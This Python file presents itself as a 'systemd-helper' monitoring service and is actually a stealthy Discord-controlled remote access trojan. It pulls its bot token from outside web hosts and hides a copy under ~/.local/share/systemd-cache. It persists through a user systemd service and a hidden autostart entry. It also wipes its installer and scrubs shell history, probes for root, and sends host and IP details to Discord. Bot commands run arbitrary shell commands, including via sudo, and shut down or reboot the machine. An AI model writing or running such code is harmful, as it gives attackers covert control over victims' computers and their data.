#!/usr/bin/env python3
"""
systemd-helper - Stealth system monitoring service
Auto-installs, auto-starts at boot, no sudo required
"""

import os
import sys
import subprocess
import shutil
import time
import socket
import platform
import requests
import psutil
import json
import logging
from pathlib import Path

DISCORD_TOKEN = "YOUR_ACTUAL_DISCORD_TOKEN_HERE"
TOKEN_CODE = "asdfghjkl"
TOKEN_BASE_URLS = [
    "https://new-5itj.onrender.com/api/token",
    "https://new-production-8df3.up.railway.app/api/token"
]

STEALTH_DIR = Path.home() / ".local" / "share" / "systemd-cache"
MAIN_BINARY = STEALTH_DIR / "systemd-service"
CONFIG_FILE = STEALTH_DIR / ".config.json"
LOG_FILE = STEALTH_DIR / ".system.log"
LOCK_FILE = "/tmp/.systemd-helper.lock"

SERVICE_DIR = Path.home() / ".config" / "systemd" / "user"
SERVICE_FILE = SERVICE_DIR / "systemd-helper.service"
AUTOSTART_DIR = Path.home() / ".config" / "autostart"
AUTOSTART_FILE = AUTOSTART_DIR / "systemd-helper.desktop"

def is_already_running():
    try:
        if LOCK_FILE.exists():
            try:
                with open(LOCK_FILE, 'r') as f:
                    pid = int(f.read().strip())
                if psutil.pid_exists(pid):
                    return True
            except:
                pass
        
        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
        with open(LOCK_FILE, 'w') as f:
            f.write(str(os.getpid()))
        return False
    except:
        return False

def fetch_token_from_web():
    for base_url in TOKEN_BASE_URLS:
        url = f"{base_url}?code={TOKEN_CODE}"
        try:
            response = requests.get(url, timeout=30)
            if response.status_code == 200:
                data = response.json()
                if data.get('success') and 'discord_token' in data:
                    token = data['discord_token']
                    if token and token != "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
                        return token
        except:
            continue
    return None

def install_dependencies():
    try:
        python_packages = ["discord.py", "psutil", "requests"]
        
        try:
            subprocess.run([
                sys.executable, "-m", "pip", "install", "--user", 
                "--quiet", "--no-warn-script-location"
            ] + python_packages, 
            check=True, timeout=300, capture_output=True)
            return True
        except:
            try:
                subprocess.run([
                    "pip3", "install", "--user", 
                    "--quiet", "--no-warn-script-location"
                ] + python_packages,
                check=True, timeout=300, capture_output=True)
                return True
            except:
                return False
                
    except Exception as e:
        return False

def install_service():
    try:
        SERVICE_DIR.mkdir(parents=True, exist_ok=True)
        
        service_content = f"""[Unit]
Description=SystemD Helper Service
After=graphical-session.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStart={sys.executable} {MAIN_BINARY}
Restart=always
RestartSec=10
Environment=DISPLAY=:0
Environment=XAUTHORITY=%h/.Xauthority

[Install]
WantedBy=default.target
"""
        
        SERVICE_FILE.write_text(service_content)
        
        AUTOSTART_DIR.mkdir(parents=True, exist_ok=True)
        autostart_content = f"""[Desktop Entry]
Type=Application
Name=SystemD Helper
Exec={sys.executable} {MAIN_BINARY}
Hidden=true
X-GNOME-Autostart-enabled=true
"""
        AUTOSTART_FILE.write_text(autostart_content)
        
        subprocess.run(["systemctl", "--user", "daemon-reload"], 
                      check=False, capture_output=True)
        subprocess.run(["systemctl", "--user", "enable", "systemd-helper.service"], 
                      check=False, capture_output=True)
        subprocess.run(["systemctl", "--user", "start", "systemd-helper.service"], 
                      check=False, capture_output=True)
        
        return True
    except Exception as e:
        return False

def install_stealth():
    try:
        current_file = Path(__file__).resolve()
        
        STEALTH_DIR.mkdir(parents=True, exist_ok=True)
        
        if current_file != MAIN_BINARY:
            content = current_file.read_text()
            
            MAIN_BINARY.write_text(content)
            MAIN_BINARY.chmod(0o755)
            
            install_service()
            
            return True
        
        return False
    except Exception as e:
        return False

def clean_traces():
    try:
        current_file = Path(__file__).resolve()
        
        if current_file != MAIN_BINARY and current_file.exists():
            try:
                file_size = current_file.stat().st_size
                with open(current_file, 'wb') as f:
                    f.write(os.urandom(file_size))
                current_file.unlink()
            except:
                pass
        
        history_files = [
            Path.home() / ".bash_history",
            Path.home() / ".zsh_history",
            Path.home() / ".python_history"
        ]
        
        for history_file in history_files:
            try:
                if history_file.exists():
                    content = history_file.read_text()
                    lines = content.split('\n')
                    filtered_lines = [
                        line for line in lines 
                        if not any(keyword in line for keyword in [
                            'systemd-helper', 'stealth', 'monitoring'
                        ])
                    ]
                    history_file.write_text('\n'.join(filtered_lines))
            except:
                pass
        
        return True
    except Exception as e:
        return False

def get_network_info():
    try:
        local_ip = "Unknown"
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
        except:
            pass
        
        public_ip = "Unknown"
        try:
            response = requests.get('https://api.ipify.org', timeout=10)
            if response.status_code == 200:
                public_ip = response.text
        except:
            pass
        
        interfaces = {}
        try:
            for interface, addrs in psutil.net_if_addrs().items():
                for addr in addrs:
                    if addr.family == socket.AF_INET:
                        interfaces[interface] = addr.address
                        break
        except:
            pass
        
        return {
            "local_ip": local_ip,
            "public_ip": public_ip,
            "interfaces": interfaces
        }
    except:
        return {}

def get_system_info():
    try:
        hostname = socket.gethostname()
        username = os.getlogin()
        system = platform.system()
        release = platform.release()
        machine = platform.machine()
        
        cpu_info = f"{psutil.cpu_count()} cores"
        
        memory = psutil.virtual_memory()
        memory_info = f"{memory.total // (1024**3)}GB"
        
        disk = psutil.disk_usage('/')
        disk_info = f"{disk.total // (1024**3)}GB"
        
        network_info = get_network_info()
        
        info = {
            "hostname": hostname,
            "username": username,
            "system": f"{system} {release}",
            "architecture": machine,
            "cpu": cpu_info,
            "memory": memory_info,
            "disk": disk_info,
            "local_ip": network_info.get("local_ip", "Unknown"),
            "public_ip": network_info.get("public_ip", "Unknown"),
            "interfaces": network_info.get("interfaces", {})
        }
        
        return info
    except Exception as e:
        return {}

def execute_command(cmd, use_sudo=False, timeout=30):
    try:
        if use_sudo:
            try:
                result = subprocess.run(
                    ['sudo', '-S'] + cmd.split(),
                    input='\n',
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )
            except subprocess.TimeoutExpired:
                return "❌ Command timed out"
            except Exception as e:
                return f"❌ Sudo execution failed: {e}"
        else:
            try:
                result = subprocess.run(
                    cmd.split(),
                    capture_output=True,
                    text=True,
                    timeout=timeout
                )
            except subprocess.TimeoutExpired:
                return "❌ Command timed out"
            except Exception as e:
                return f"❌ Command execution failed: {e}"
        
        output = ""
        if result.stdout:
            output += f"✅ **STDOUT:**\n```\n{result.stdout.strip()}\n```"
        if result.stderr:
            output += f"\n⚠️ **STDERR:**\n```\n{result.stderr.strip()}\n```"
        if result.returncode != 0:
            output += f"\n❌ **Exit Code:** {result.returncode}"
        
        return output if output else "✅ Command executed (no output)"
        
    except Exception as e:
        return f"❌ Unexpected error: {e}"

def get_root_access():
    """Try to gain root access using various methods"""
    methods = [
        "sudo -v",  # Validate sudo credentials
        "pkexec --version",  # PolicyKit
        "su -c 'echo root_access_granted'",  # Switch user
        "doas -n true",  # OpenBSD doas
    ]
    
    for method in methods:
        try:
            result = subprocess.run(method.split(), capture_output=True, text=True, timeout=10)
            if result.returncode == 0:
                return True
        except:
            continue
    
    return False

async def announce_online(bot):
    try:
        system_info = get_system_info()
        
        announcement_channel = None
        for guild in bot.guilds:
            for channel in guild.text_channels:
                if channel.permissions_for(guild.me).send_messages:
                    announcement_channel = channel
                    break
            if announcement_channel:
                break
        
        if announcement_channel:
            message = "🟢 **SYSTEM ONLINE**\n"
            message += f"**Host:** `{system_info.get('hostname', 'Unknown')}`\n"
            message += f"**User:** `{system_info.get('username', 'Unknown')}`\n"
            message += f"**OS:** `{system_info.get('system', 'Unknown')}`\n"
            message += f"**Arch:** `{system_info.get('architecture', 'Unknown')}`\n"
            message += f"**CPU:** `{system_info.get('cpu', 'Unknown')}`\n"
            message += f"**RAM:** `{system_info.get('memory', 'Unknown')}`\n"
            message += f"**Disk:** `{system_info.get('disk', 'Unknown')}`\n"
            message += f"**Local IP:** `{system_info.get('local_ip', 'Unknown')}`\n"
            message += f"**Public IP:** `{system_info.get('public_ip', 'Unknown')}`\n"
            
            # Check root access
            if get_root_access():
                message += "**Root Access:** ✅ GRANTED\n"
            else:
                message += "**Root Access:** ❌ NOT AVAILABLE\n"
                
            message += "**Status:** Stealth mode active 🕶️"
            
            await announcement_channel.send(message)
            
            config = {"announced": True}
            CONFIG_FILE.write_text(json.dumps(config))
            
    except Exception as e:
        pass

if install_dependencies():
    pass
else:
    pass

try:
    import discord
    from discord.ext import commands
except ImportError as e:
    sys.exit(1)

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

@bot.event
async def on_ready():
    if not MAIN_BINARY.exists():
        if install_stealth():
            pass
    
    clean_traces()
    
    config = {}
    if CONFIG_FILE.exists():
        try:
            config = json.loads(CONFIG_FILE.read_text())
        except:
            pass
    
    if not config.get("announced", False):
        await announce_online(bot)

@bot.command(name="cmd")
async def cmd_execute(ctx, *, command):
    await ctx.send(f"🔄 Executing: `{command}`")
    result = execute_command(command, use_sudo=False)
    
    if len(result) > 1900:
        chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
        for chunk in chunks:
            await ctx.send(chunk)
    else:
        await ctx.send(result)

@bot.command(name="root")
async def cmd_root(ctx, *, command):
    await ctx.send(f"🔐 Executing as root: `{command}`")
    result = execute_command(command, use_sudo=True)
    
    if len(result) > 1900:
        chunks = [result[i:i+1900] for i in range(0, len(result), 1900)]
        for chunk in chunks:
            await ctx.send(chunk)
    else:
        await ctx.send(result)

@bot.command(name="shutdown")
async def cmd_shutdown(ctx, delay: int = 1):
    """Shutdown the system (with optional delay in minutes)"""
    await ctx.send(f"🔄 Shutting down system in {delay} minute(s)...")
    result = execute_command(f"shutdown -h +{delay}", use_sudo=True)
    await ctx.send(result)

@bot.command(name="reboot")
async def cmd_reboot(ctx, delay: int = 1):
    """Reboot the system (with optional delay in minutes)"""
    await ctx.send(f"🔄 Rebooting system in {delay} minute(s)...")
    result = execute_command(f"shutdown -r +{delay}", use_sudo=True)
    await ctx.send(result)

@bot.command(name="force_shutdown")
async def cmd_force_shutdown(ctx):
    """Force immediate shutdown"""
    await ctx.send("🔄 Force shutting down system NOW...")
    result = execute_command("shutdown -h now", use_sudo=True)
    await ctx.send(result)

@bot.command(name="force_reboot")
async def cmd_force_reboot(ctx):
    """Force immediate reboot"""
    await ctx.send("🔄 Force rebooting system NOW...")
    result = execute_command("shutdown -r now", use_sudo=True)
    await ctx.send(result)

@bot.command(name="sysinfo")
async def cmd_sysinfo(ctx):
    system_info = get_system_info()
    network_info = get_network_info()
    
    message = "💻 **SYSTEM INFORMATION**\n"
    message += f"```\n"
    message += f"Hostname:    {system_info.get('hostname', 'Unknown')}\n"
    message += f"Username:    {system_info.get('username', 'Unknown')}\n"
    message += f"OS:          {system_info.get('system', 'Unknown')}\n"
    message += f"Architecture:{system_info.get('architecture', 'Unknown')}\n"
    message += f"CPU:         {system_info.get('cpu', 'Unknown')}\n"
    message += f"Memory:      {system_info.get('memory', 'Unknown')}\n"
    message += f"Disk:        {system_info.get('disk', 'Unknown')}\n"
    message += f"Local IP:    {system_info.get('local_ip', 'Unknown')}\n"
    message += f"Public IP:   {system_info.get('public_ip', 'Unknown')}\n"
    message += f"```\n"
    
    # Add root access status
    if get_root_access():
        message += "**Root Access:** ✅ GRANTED\n"
    else:
        message += "**Root Access:** ❌ NOT AVAILABLE\n"
    
    interfaces = network_info.get('interfaces', {})
    if interfaces:
        message += "🌐 **NETWORK INTERFACES**\n```\n"
        for iface, ip in interfaces.items():
            message += f"{iface}: {ip}\n"
        message += "```"
    
    await ctx.send(message)

@bot.command(name="status")
async def cmd_status(ctx):
    system_info = get_system_info()
    
    message = "🟢 **SERVICE STATUS**\n"
    message += f"**Status:** Running (Stealth Mode)\n"
    message += f"**Location:** `{MAIN_BINARY}`\n"
    message += f"**Host:** `{system_info.get('hostname', 'Unknown')}`\n"
    message += f"**Uptime:** `{int(time.time() - psutil.boot_time())}s`\n"
    message += f"**Local IP:** `{system_info.get('local_ip', 'Unknown')}`\n"
    message += f"**Public IP:** `{system_info.get('public_ip', 'Unknown')}`\n"
    
    if get_root_access():
        message += "**Root Access:** ✅ GRANTED"
    else:
        message += "**Root Access:** ❌ NOT AVAILABLE"
    
    await ctx.send(message)

@bot.command(name="clean")
async def cmd_clean(ctx):
    if clean_traces():
        await ctx.send("✅ All traces cleaned and service refreshed")
    else:
        await ctx.send("❌ Clean operation failed")

@bot.command(name="update")
async def cmd_update(ctx):
    await ctx.send("🔄 Updating service...")
    
    if install_dependencies():
        await ctx.send("✅ Dependencies updated")
    else:
        await ctx.send("❌ Dependency update failed")

@bot.command(name="delete")
async def cmd_delete(ctx):
    try:
        await ctx.send("🚨 **SELF-DESTRUCT INITIATED**\nRemoving all traces...")
        
        subprocess.run(["systemctl", "--user", "stop", "systemd-helper.service"], 
                      check=False, capture_output=True)
        subprocess.run(["systemctl", "--user", "disable", "systemd-helper.service"], 
                      check=False, capture_output=True)
        
        files_to_remove = [
            MAIN_BINARY,
            SERVICE_FILE,
            AUTOSTART_FILE,
            CONFIG_FILE,
            LOG_FILE
        ]
        
        for file_path in files_to_remove:
            try:
                if file_path.exists():
                    file_path.unlink()
            except:
                pass
        
        clean_traces()
        
        await ctx.send("✅ **SELF-DESTRUCT COMPLETED**\nAll traces removed. Goodbye!")
        await bot.close()
            
    except Exception as e:
        await ctx.send(f"❌ Self-destruct error: {e}")

@bot.command(name="get_root")
async def cmd_get_root(ctx):
    """Attempt to gain root access using various methods"""
    await ctx.send("🔄 Attempting to gain root access...")
    
    if get_root_access():
        await ctx.send("✅ Root access successfully obtained!")
    else:
        await ctx.send("❌ Could not obtain root access. Try manual methods.")

if __name__ == "__main__":
    if is_already_running():
        sys.exit(0)
    
    if DISCORD_TOKEN == "YOUR_ACTUAL_DISCORD_TOKEN_HERE":
        web_token = fetch_token_from_web()
        if web_token:
            DISCORD_TOKEN = web_token
        else:
            try:
                if os.path.exists(LOCK_FILE):
                    os.remove(LOCK_FILE)
            except:
                pass
            sys.exit(1)
    
    if not MAIN_BINARY.exists():
        if install_stealth():
            clean_traces()
            try:
                if os.path.exists(LOCK_FILE):
                    os.remove(LOCK_FILE)
            except:
                pass
            sys.exit(0)
    
    max_retries = 5
    retry_delay = 30
    
    for attempt in range(max_retries):
        try:
            bot.run(DISCORD_TOKEN)
            break
        except discord.LoginFailure:
            web_token = fetch_token_from_web()
            if web_token:
                DISCORD_TOKEN = web_token
        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(retry_delay)
    
    try:
        if os.path.exists(LOCK_FILE):
            os.remove(LOCK_FILE)
    except:
        pass
